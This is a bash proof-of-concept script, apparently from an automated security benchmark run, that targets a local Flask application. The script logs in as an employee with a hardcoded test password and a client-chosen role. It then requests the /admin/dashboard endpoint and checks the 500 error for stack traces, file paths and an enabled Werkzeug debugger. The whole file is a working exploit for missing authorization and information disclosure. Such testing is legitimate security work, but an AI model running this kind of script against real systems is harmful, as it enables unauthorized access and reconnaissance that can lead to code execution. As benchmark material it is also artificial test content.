#!/bin/bash
# POC: Demonstrates missing authorization check on /admin/dashboard endpoint causing 500 error with stack trace information disclosure
# Target: ./repo
# Created: 2025-12-01T15:56:29.534Z
# Session: benchmark-XBEN-089-24-minbd498

# POC for Missing Authorization Check - 500 Error Information Disclosure
# Target: /admin/dashboard endpoint with non-admin role

TARGET_URL="http://localhost:5003"
ADMIN_ENDPOINT="$TARGET_URL/admin/dashboard"
LOGIN_ENDPOINT="$TARGET_URL/login"

echo "=== Missing Authorization Check - 500 Error Information Disclosure POC ==="
echo ""

# Step 1: Login as employee
echo "[*] Step 1: Logging in as employee with role=employee..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$LOGIN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=emp&password=password1&role=employee")

echo "[+] Login response received"
echo ""

# Step 2: Verify employee session was created
echo "[*] Step 2: Verifying employee session..."
curl -s -b /tmp/cookies.txt "$TARGET_URL/" > /dev/null
echo "[+] Session cookie stored"
echo ""

# Step 3: Access admin dashboard with employee role
echo "[*] Step 3: Attempting to access /admin/dashboard with employee role..."
DASHBOARD_RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt "$ADMIN_ENDPOINT")

# Extract HTTP status code (last line)
HTTP_CODE=$(echo "$DASHBOARD_RESPONSE" | tail -n 1)
BODY=$(echo "$DASHBOARD_RESPONSE" | head -n -1)

echo "[+] Response HTTP Code: $HTTP_CODE"
echo ""

# Step 4: Check for vulnerability indicators
echo "[*] Step 4: Analyzing response for vulnerability indicators..."
echo ""

if echo "$HTTP_CODE" | grep -q "500"; then
    echo "[!] VULNERABILITY CONFIRMED: HTTP 500 Error returned"
    echo ""
    
    # Check for information disclosure indicators
    if echo "$BODY" | grep -q "Traceback"; then
        echo "[!] INFORMATION DISCLOSURE: Full stack trace present in response"
    fi
    
    if echo "$BODY" | grep -q "site-packages"; then
        echo "[!] INFORMATION DISCLOSURE: File paths exposed (/site-packages/)"
    fi
    
    if echo "$BODY" | grep -q "app.py"; then
        echo "[!] INFORMATION DISCLOSURE: Application source code path exposed"
    fi
    
    if echo "$BODY" | grep -q "The view function"; then
        echo "[!] INFORMATION DISCLOSURE: Flask error message reveals missing return statement"
    fi
    
    if echo "$BODY" | grep -q "EVALEX"; then
        echo "[!] INFORMATION DISCLOSURE: Werkzeug debugger enabled (EVALEX=true)"
    fi
    
    if echo "$BODY" | grep -q "did not return a valid response"; then
        echo "[!] AUTHORIZATION BYPASS CONFIRMED: View function returned None instead of error response"
    fi
    
    echo ""
    echo "[+] Vulnerability successfully demonstrated"
    echo ""
    echo "[*] Response snippet (first 500 chars of body):"
    echo "$BODY" | head -c 500
    echo "..."
    echo ""
    
else
    echo "[-] Unexpected HTTP response: $HTTP_CODE"
    echo "[-] This may indicate the vulnerability has been patched"
    exit 1
fi

echo "[+] POC completed successfully"